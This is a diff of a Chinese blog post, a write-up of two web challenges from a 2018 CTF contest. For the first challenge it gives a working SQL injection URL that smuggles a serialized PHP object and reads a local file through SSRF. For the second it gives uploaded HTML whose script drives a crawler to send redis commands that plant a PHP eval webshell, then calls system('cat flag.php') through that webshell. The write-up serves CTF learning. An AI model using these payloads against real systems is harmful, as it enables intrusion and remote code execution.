@@ -46,7 +46,7 @@
     "articleSection" : "posts",
     "name" : "网鼎杯-Web-Writeup",
     "headline" : "网鼎杯-Web-Writeup",
-    "description" : "fakebook 访问 robots.txt 得到泄露的文件 user.php.bak： Disallow: \/user.php.bak Sitemap: http:\/\/domain.com\/sitemap.xml \x26lt;?php class UserInfo { public $name = \x26quot;\x26quot;; public $age = 0; public $blog = \x26quot;\x26quot;; public function __construct($name, $age, $blog) { $this-\x26gt;name = $name; $this-\x26gt;age = (int)$age; $this-\x26gt;blog = $blog; } function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch,",
+    "description" : "fakebook 访问 robots.txt 得到泄露的文件 user.php.bak： Disallow: \/user.php.bak Sitemap: http:\/\/domain.com\/sitemap.xml \x26lt;?php class UserInfo { public $name = \x26#34;\x26#34;; public $age = 0; public $blog = \x26#34;\x26#34;; public function __construct($name, $age, $blog) { $this-\x26gt;name = $name; $this-\x26gt;age = (int)$age; $this-\x26gt;blog = $blog; } function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch,",
     "inLanguage" : "zh-cn",
     "author" : "syang",
     "creator" : "syang",
@@ -57,7 +57,7 @@
     "datePublished": "2018-08-20 18:35:43 \x2b0000 UTC",
     "dateModified" : "2018-08-20 18:35:43 \x2b0000 UTC",
     "url" : "https:\/\/syang-ng.github.io\/2018\/08\/wangding-web-writeup\/",
-    "wordCount" : "1506",
+    "wordCount" : "1510",
     "keywords" : [  "syang\x27s blog"]
 }
 </script>
@@ -145,84 +145,63 @@
           
           
 
-          
-
-<h2 id="fakebook">fakebook</h2>
-
+          <h2 id="fakebook">fakebook</h2>
 <p>访问 <code>robots.txt</code> 得到泄露的文件 <code>user.php.bak</code>：</p>
-
 <pre><code>Disallow: /user.php.bak
 Sitemap: http://domain.com/sitemap.xml
-</code></pre>
-
-<pre><code class="language-php">&lt;?php
-class UserInfo
+</code></pre><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">UserInfo</span>
 {
-    public $name = &quot;&quot;;
-    public $age = 0;
-    public $blog = &quot;&quot;;
+    <span style="color:#66d9ef">public</span> $name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+    <span style="color:#66d9ef">public</span> $age <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">public</span> $blog <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
 
-    public function __construct($name, $age, $blog)
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($name, $age, $blog)
     {
-        $this-&gt;name = $name;
-        $this-&gt;age = (int)$age;
-        $this-&gt;blog = $blog;
+        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> $name;
+        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">age</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">int</span>)$age;
+        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">blog</span> <span style="color:#f92672">=</span> $blog;
     }
 
-    function get($url)
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get</span>($url)
     {
-        $ch = curl_init();
+        $ch <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_init</span>();
 
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        $output = curl_exec($ch);
-        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        if($httpCode == 404) {
-            return 404;
+        <span style="color:#a6e22e">curl_setopt</span>($ch, <span style="color:#a6e22e">CURLOPT_URL</span>, $url);
+        <span style="color:#a6e22e">curl_setopt</span>($ch, <span style="color:#a6e22e">CURLOPT_RETURNTRANSFER</span>, <span style="color:#ae81ff">1</span>);
+        $output <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_exec</span>($ch);
+        $httpCode <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_getinfo</span>($ch, <span style="color:#a6e22e">CURLINFO_HTTP_CODE</span>);
+        <span style="color:#66d9ef">if</span>($httpCode <span style="color:#f92672">==</span> <span style="color:#ae81ff">404</span>) {
+            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">404</span>;
         }
-        curl_close($ch);
+        <span style="color:#a6e22e">curl_close</span>($ch);
 
-        return $output;
+        <span style="color:#66d9ef">return</span> $output;
     }
 
-    public function getBlogContents ()
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getBlogContents</span> ()
     {
-        return $this-&gt;get($this-&gt;blog);
+        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">blog</span>);
     }
 
-    public function isValidBlog ()
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isValidBlog</span> ()
     {
-        $blog = $this-&gt;blog;
-        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);
+        $blog <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">blog</span>;
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&#34;</span>, $blog);
     }
 }
-</code></pre>
-
-<p>测试页面功能，可以猜测 <code>view.php?no=xxx</code> 处存在 sql 注入的问题：</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/wangding-web-writeup/view1.png" alt="view 1" class="lazyload"><figcaption class="image-caption">view 1</figcaption></figure></p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/wangding-web-writeup/view2.png" alt="view 2" class="lazyload"><figcaption class="image-caption">view 2</figcaption></figure></p>
-
+</code></pre></div><p>测试页面功能，可以猜测 <code>view.php?no=xxx</code> 处存在 sql 注入的问题：</p>
+<p><img src="/images/posts/wangding-web-writeup/view1.png" alt="view 1"></p>
+<p><img src="/images/posts/wangding-web-writeup/view2.png" alt="view 2"></p>
 <p>可以看到此时页面会报 unserialize() 的相应错误，那么可以做一个合理的猜测，页面会将从 mysql 中取出的数据，并将数据反序列化后再填充到页面上</p>
-
 <p>而此时应该会调用 <code>getBlogContents()</code> 函数，那么这里必然存在一个 SSRF 的问题，我们只要构造 payload 使得其访问 <code>/var/www/html/flag.php</code> 即可</p>
-
 <p>那么我们可以尝试构造相应序列化数据作为 payload：<code>O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:24;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}</code></p>
-
 <p>最后 payload 如下：</p>
-
 <pre><code>http://80be5985cb9c4234bd4d0459d6a7f7238f336e1e2c514d60.game.ichunqiu.com/view.php?no=-1/**/union/**/select/**/1,2,3,%27O:8:%22UserInfo%22:3:{s:4:%22name%22;s:5:%22admin%22;s:3:%22age%22;i:24;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;}%27%23
-</code></pre>
-
-<p>查看源代码即可获得 base64 编码后的 flag，解码即可得到 <code>flag{a004021a-5f34-4692-b9b2-f5b50e6c095f}</code>：</p>
-
-<pre><code class="language-html">&lt;iframe width='100%' height='10em' src='data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3thMDA0MDIxYS01ZjM0LTQ2OTItYjliMi1mNWI1MGU2YzA5NWZ9IjsNCmV4aXQoMCk7DQo='&gt;
-</code></pre>
-
-<p>我们可以通过相同的方式获得 <code>view.php</code> 的源码来加深我们的理解：</p>
-
-<pre><code class="language-php+HTML">&lt;?php session_start(); ?&gt;
+</code></pre><p>查看源代码即可获得 base64 编码后的 flag，解码即可得到 <code>flag{a004021a-5f34-4692-b9b2-f5b50e6c095f}</code>：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;100%&#39;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;10em&#39;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3thMDA0MDIxYS01ZjM0LTQ2OTItYjliMi1mNWI1MGU2YzA5NWZ9IjsNCmV4aXQoMCk7DQo=&#39;</span>&gt;
+</code></pre></div><p>我们可以通过相同的方式获得 <code>view.php</code> 的源码来加深我们的理解：</p>
+<pre><code class="language-php+HTML" data-lang="php+HTML">&lt;?php session_start(); ?&gt;
 &lt;?php require_once 'db.php'; ?&gt;
 &lt;?php require_once 'user.php'; ?&gt;
 &lt;?php require_once 'error.php'; ?&gt;
@@ -307,188 +286,163 @@ $user = unserialize($res['data']);
 &lt;/div&gt;
 &lt;/body&gt;
 &lt;/html&gt;
-</code></pre>
-
-<p>非常悲伤的在本题陷入误区了，选择了绕过 <code>isValidBlog</code>，构造 url 使其指向 <code>127.0.0.1</code> 但最后仍然不能访问到相应文件，想来是禁止了 http 协议的访问（😭</p>
-
+</code></pre><p>非常悲伤的在本题陷入误区了，选择了绕过 <code>isValidBlog</code>，构造 url 使其指向 <code>127.0.0.1</code> 但最后仍然不能访问到相应文件，想来是禁止了 http 协议的访问（😭</p>
 <h2 id="spider">spider</h2>
-
 <p>首先尝试访问 <code>robots.txt</code>，发现存在 <code>/get_sourcecode</code> 页面，但页面提示 <code>NOT 127.0.0.1</code>，由此可以推测可能需要通过其他方式使得服务器去访问该网址</p>
-
 <p>那么我们从网址提供的功能入手：</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/wangding-web-writeup/spider.png" alt="spider" class="lazyload"><figcaption class="image-caption">spider</figcaption></figure></p>
-
+<p><img src="/images/posts/wangding-web-writeup/spider.png" alt="spider"></p>
 <p>根据提示我们可以知道该网站提供的是动态爬虫的功能，简单说该页面可以抓取动态网页，那么显然我们可以在我们提交的 html 文件中写入 js 代码，js 代码在服务器访问的过程中会被执行：</p>
-
-<pre><code class="language-html">&lt;html&gt;
-	&lt;body&gt;
-		&lt;a id='test' href=&quot;&quot;&gt;1&lt;/a&gt;
-		&lt;script src=&quot;http://127.0.0.1/vendor/jquery-1.11.1.min.js&quot;&gt;&lt;/script&gt;
-		&lt;script&gt;
-		$.get('http://127.0.0.1/get_sourcecode', function(data){
-			document.getElementById(&quot;test&quot;).innerHTML=data;
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+	&lt;<span style="color:#f92672">body</span>&gt;
+		&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;test&#39;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;1&lt;/<span style="color:#f92672">a</span>&gt;
+		&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://127.0.0.1/vendor/jquery-1.11.1.min.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+		&lt;<span style="color:#f92672">script</span>&gt;
+		<span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;http://127.0.0.1/get_sourcecode&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">data</span>){
+			document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;test&#34;</span>).<span style="color:#a6e22e">innerHTML</span><span style="color:#f92672">=</span><span style="color:#a6e22e">data</span>;
 		});
-		&lt;/script&gt;
-	&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-
-<p>可以看到服务器访问 <code>get_sourcecode</code> 并在相应页面上输出内容：</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/wangding-web-writeup/sourcecode.png" alt="source code" class="lazyload"><figcaption class="image-caption">source code</figcaption></figure></p>
-
+		&lt;/<span style="color:#f92672">script</span>&gt;
+	&lt;/<span style="color:#f92672">body</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><p>可以看到服务器访问 <code>get_sourcecode</code> 并在相应页面上输出内容：</p>
+<p><img src="/images/posts/wangding-web-writeup/sourcecode.png" alt="source code"></p>
 <p>获得源代码如下：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#75715e"># -*- encoding: utf-8 -*-</span>
 
-<pre><code class="language-python">#!/usr/bin/env python
-# -*- encoding: utf-8 -*-
+<span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request 
+<span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> render_template
+<span style="color:#f92672">import</span> os
+<span style="color:#f92672">import</span> uuid
+<span style="color:#f92672">import</span> tempfile
+<span style="color:#f92672">import</span> subprocess
+<span style="color:#f92672">import</span> time
+<span style="color:#f92672">import</span> json
 
-from flask import Flask, request 
-from flask import render_template
-import os
-import uuid
-import tempfile
-import subprocess
-import time
-import json
+app <span style="color:#f92672">=</span> Flask(__name__ , static_url_path<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
 
-app = Flask(__name__ , static_url_path='')
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">proc_shell</span>(cmd):
+    out_temp <span style="color:#f92672">=</span> tempfile<span style="color:#f92672">.</span>SpooledTemporaryFile(bufsize<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span><span style="color:#f92672">*</span><span style="color:#ae81ff">1000</span>)
+    fileno <span style="color:#f92672">=</span> out_temp<span style="color:#f92672">.</span>fileno()
+    proc <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>Popen(cmd, stderr<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE, stdout<span style="color:#f92672">=</span>fileno, shell<span style="color:#f92672">=</span>False)
+    start_time <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
+    <span style="color:#66d9ef">while</span> True:
+        <span style="color:#66d9ef">if</span> proc<span style="color:#f92672">.</span>poll() <span style="color:#f92672">==</span> None:
+            <span style="color:#66d9ef">if</span> time<span style="color:#f92672">.</span>time() <span style="color:#f92672">-</span> start_time <span style="color:#f92672">&amp;</span>gt; <span style="color:#ae81ff">30</span>:
+                proc<span style="color:#f92672">.</span>terminate()
+                proc<span style="color:#f92672">.</span>kill()
+                proc<span style="color:#f92672">.</span>communicate()
+                out_temp<span style="color:#f92672">.</span>seek(<span style="color:#ae81ff">0</span>)
+                out_temp<span style="color:#f92672">.</span>close()
+                <span style="color:#66d9ef">return</span>
+            <span style="color:#66d9ef">else</span>:
+                time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
+        <span style="color:#66d9ef">else</span>:
+            proc<span style="color:#f92672">.</span>communicate()
+            out_temp<span style="color:#f92672">.</span>seek(<span style="color:#ae81ff">0</span>)
+            data <span style="color:#f92672">=</span> out_temp<span style="color:#f92672">.</span>read()
+            out_temp<span style="color:#f92672">.</span>close()
+            <span style="color:#66d9ef">return</span> data
 
-def proc_shell(cmd):
-    out_temp = tempfile.SpooledTemporaryFile(bufsize=1000*1000)
-    fileno = out_temp.fileno()
-    proc = subprocess.Popen(cmd, stderr=subprocess.PIPE, stdout=fileno, shell=False)
-    start_time = time.time()
-    while True:
-        if proc.poll() == None:
-            if time.time() - start_time &amp;gt; 30:
-                proc.terminate()
-                proc.kill()
-                proc.communicate()
-                out_temp.seek(0)
-                out_temp.close()
-                return
-            else:
-                time.sleep(1)
-        else:
-            proc.communicate()
-            out_temp.seek(0)
-            data = out_temp.read()
-            out_temp.close()
-            return data
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">casperjs_html</span>(url):
+    cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;casperjs {0} --ignore-ssl-errors=yes --url={1}&#39;</span><span style="color:#f92672">.</span>format(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>dirname(__file__) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/casper/casp.js&#39;</span> ,url)
+    cmd <span style="color:#f92672">=</span> cmd<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)
+    stdout <span style="color:#f92672">=</span> proc_shell(cmd)
+    <span style="color:#66d9ef">try</span>:
+        result <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(stdout)
+        links <span style="color:#f92672">=</span> result<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;resourceRequestUrls&#39;</span>)
+        <span style="color:#66d9ef">return</span> links
+    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>, e:
+        <span style="color:#66d9ef">return</span> []
 
-def casperjs_html(url):
-    cmd = 'casperjs {0} --ignore-ssl-errors=yes --url={1}'.format(os.path.dirname(__file__) + '/casper/casp.js' ,url)
-    cmd = cmd.split(' ')
-    stdout = proc_shell(cmd)
-    try:
-        result = json.loads(stdout)
-        links = result.get('resourceRequestUrls')
-        return links
-    except Exception, e:
-        return []
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;GET&#39;</span>:
+        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>)
+    <span style="color:#66d9ef">else</span>:
+        f <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>files[<span style="color:#e6db74">&#39;file&#39;</span>]
+        filename <span style="color:#f92672">=</span> str(uuid<span style="color:#f92672">.</span>uuid1()) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.html&#39;</span>
+        basepath <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>dirname(__file__)
+        upload_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(basepath, <span style="color:#e6db74">&#39;static/upload/&#39;</span>, filename)
+        content <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+        <span style="color:#75715e">#hint</span>
+        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;level=low_273eac1c&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> content <span style="color:#f92672">and</span> <span style="color:#e6db74">&#39;dbfilename&#39;</span> <span style="color:#f92672">in</span> content<span style="color:#f92672">.</span>lower():
+            <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>, msg<span style="color:#f92672">=</span><span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;Warning: 发现恶意关键字&#39;</span>)
+        <span style="color:#75715e">#hint</span>
+        <span style="color:#66d9ef">with</span> open(upload_path, <span style="color:#e6db74">&#39;w&#39;</span>) <span style="color:#66d9ef">as</span> f:
+            f<span style="color:#f92672">.</span>write(content)
+        url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://127.0.0.1:80/upload/&#39;</span><span style="color:#f92672">+</span>filename
+        links <span style="color:#f92672">=</span> casperjs_html(url)
+        links <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join(links)
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> links:
+            links <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;NULL&#39;</span>
+        links <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;URL: &#39;</span><span style="color:#f92672">+</span>url<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span>links
+        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>, links<span style="color:#f92672">=</span>links)
 
-@app.route('/', methods=['GET', 'POST'])
-def index():
-    if request.method == 'GET':
-        return render_template('index.html')
-    else:
-        f = request.files['file']
-        filename = str(uuid.uuid1()) + '.html'
-        basepath = os.path.dirname(__file__)
-        upload_path = os.path.join(basepath, 'static/upload/', filename)
-        content = f.read()
-        #hint
-        if 'level=low_273eac1c' not in content and 'dbfilename' in content.lower():
-            return render_template('index.html', msg=u'Warning: 发现恶意关键字')
-        #hint
-        with open(upload_path, 'w') as f:
-            f.write(content)
-        url = 'http://127.0.0.1:80/upload/'+filename
-        links = casperjs_html(url)
-        links = '\n'.join(links)
-        if not links:
-            links = 'NULL'
-        links = 'URL: '+url+'\n'+links
-        return render_template('index.html', links=links)
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/get_sourcecode&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_code</span>():
+    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;GET&#39;</span>:
+        ip <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>remote_addr
+        <span style="color:#66d9ef">if</span> ip <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>:
+            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;NOT 127.0.0.1&#39;</span>
+        <span style="color:#66d9ef">else</span>:
+            <span style="color:#66d9ef">with</span> open(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>dirname(__file__)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/run.py&#39;</span>) <span style="color:#66d9ef">as</span> f:
+                code <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+            <span style="color:#66d9ef">return</span> code
+    <span style="color:#66d9ef">else</span>:
+        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>
 
-@app.route('/get_sourcecode', methods=['GET', 'POST'])
-def get_code():
-    if request.method == 'GET':
-        ip = request.remote_addr
-        if ip != '127.0.0.1':
-            return 'NOT 127.0.0.1'
-        else:
-            with open(os.path.dirname(__file__)+'/run.py') as f:
-                code = f.read()
-            return code
-    else:
-        return ''
+<span style="color:#a6e22e">@app.errorhandler</span>(<span style="color:#ae81ff">404</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">page_not_found</span>(error):
+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;404&#39;</span>
 
-@app.errorhandler(404)
-def page_not_found(error):
-    return '404'
+<span style="color:#a6e22e">@app.errorhandler</span>(<span style="color:#ae81ff">500</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">internal_server_error</span>(error):
+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;500&#39;</span>
 
-@app.errorhandler(500)
-def internal_server_error(error):
-    return '500'
+<span style="color:#a6e22e">@app.errorhandler</span>(<span style="color:#ae81ff">403</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">unauthorized</span>(error):
+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;403&#39;</span>
 
-@app.errorhandler(403)
-def unauthorized(error):
-    return '403'
-
-if __name__ == '__main__':
-    pass
-</code></pre>
-
-<p>根据代码中的提示，我们可以发现我们需要利用的是 redis 的未授权访问来写一个 webshell</p>
-
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+    <span style="color:#66d9ef">pass</span>
+</code></pre></div><p>根据代码中的提示，我们可以发现我们需要利用的是 redis 的未授权访问来写一个 webshell</p>
 <p>在本题中，redis 服务确实在运行，但我们直接访问 6379 端口可能会出错，但不影响我们来写 payload</p>
-
 <p>根据提示我们知道 8000 端口存在着 apache2 的服务（当然是只开放给 127.0.0.1 的），那么我们可以尝试通过 redis 来写一下 php 的 webshell 然后通过在通过服务端的访问来触发（这里吐槽一句开端口这种事情不给 hint 的话要扫到猴年马月😓</p>
-
 <p>下面就是 payload 时间：</p>
-
-<pre><code class="language-HTML">&lt;html&gt;
-&lt;body&gt;
-	&lt;a id='test' href=&quot;&quot;&gt;level=low_273eac1c&lt;/a&gt;
-	&lt;script&gt;
-		var xmlhttp;
-		if (window.XMLHttpRequest) {
-			xmlhttp = new XMLHttpRequest();
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">&lt;<span style="color:#f92672">html</span>&gt;
+&lt;<span style="color:#f92672">body</span>&gt;
+	&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;test&#39;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;level=low_273eac1c&lt;/<span style="color:#f92672">a</span>&gt;
+	&lt;<span style="color:#f92672">script</span>&gt;
+		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xmlhttp</span>;
+		<span style="color:#66d9ef">if</span> (window.<span style="color:#a6e22e">XMLHttpRequest</span>) {
+			<span style="color:#a6e22e">xmlhttp</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
 		}
-		else {
-			xmlhttp = newActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+		<span style="color:#66d9ef">else</span> {
+			<span style="color:#a6e22e">xmlhttp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">newActiveXObject</span>(<span style="color:#e6db74">&#34;Microsoft.XMLHTTP&#34;</span>);
 		}
-		var formData = new FormData();
-		formData.append(&quot;0&quot;, &quot;flushall&quot; + &quot;\n&quot; + &quot;config set dir /var/www/html/&quot; + &quot;\n&quot; + &quot;config set dbfilename shell.php&quot; + &quot;\n&quot; + 'set 1 &quot;\\n\\n&lt;?php header(\'Access-Control-Allow-Origin:*\');eval($_GET[_]);?&gt;\\n\\n&quot;' + &quot;\n&quot; + &quot;save&quot; + &quot;\n&quot; + &quot;quit&quot;);
-		xmlhttp.open(&quot;POST&quot;, &quot;http://127.0.0.1:6379&quot;, true);
-		xmlhttp.send(formData);
-	&lt;/script&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-
-<pre><code class="language-HTML">&lt;html&gt;
-	&lt;body&gt;
-		&lt;a id='test' href=&quot;&quot;&gt;1&lt;/a&gt;
-		&lt;script src=&quot;http://127.0.0.1/vendor/jquery-1.11.1.min.js&quot;&gt;&lt;/script&gt;
-		&lt;script&gt;
-		$.get('http://127.0.0.1:8000/shell.php?_=system(&quot;cat flag.php&quot;);', function(data){
-			document.getElementById(&quot;test&quot;).innerHTML=data;
+		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">formData</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">FormData</span>();
+		<span style="color:#a6e22e">formData</span>.<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#34;0&#34;</span>, <span style="color:#e6db74">&#34;flushall&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\n&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;config set dir /var/www/html/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\n&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;config set dbfilename shell.php&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\n&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;set 1 &#34;\\n\\n&lt;?php header(\&#39;Access-Control-Allow-Origin:*\&#39;);eval($_GET[_]);?&gt;\\n\\n&#34;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\n&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;save&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\n&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;quit&#34;</span>);
+		<span style="color:#a6e22e">xmlhttp</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;http://127.0.0.1:6379&#34;</span>, <span style="color:#66d9ef">true</span>);
